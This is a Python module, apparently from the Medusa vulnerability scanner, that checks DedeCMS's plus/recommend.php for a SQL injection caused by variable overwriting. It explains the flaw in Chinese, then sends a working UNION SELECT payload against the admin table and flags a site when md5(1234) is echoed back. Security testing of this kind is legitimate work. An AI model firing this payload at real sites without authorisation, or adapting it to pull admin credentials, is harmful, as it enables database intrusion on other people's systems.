#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms recommend.php SQL注入
referer: http://blog.csdn.net/change518/article/details/20564207
author: Ascotbe
reference: Lucifer

description: 1.首先执行到plus/recommand.php，包含了include/common.inc.php
        2.只要提交的URL中不包含cfg_|GLOBALS|_GET|_POST|_COOKIE，即可通过检查，_FILES[type][tmp_name]被带入
        3.在29行处，URL参数中的_FILES[type][tmp_name]，$_key为type，$$_key即为$type，从而导致了$type变量的覆盖
        4.回到recommand.php中，注入语句被带入数据库查询
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27AnD+ChAr(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(1234),5,6,7,8,9%20FrOm%20`%23@__admin`%23"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在dedecms recommend.php SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass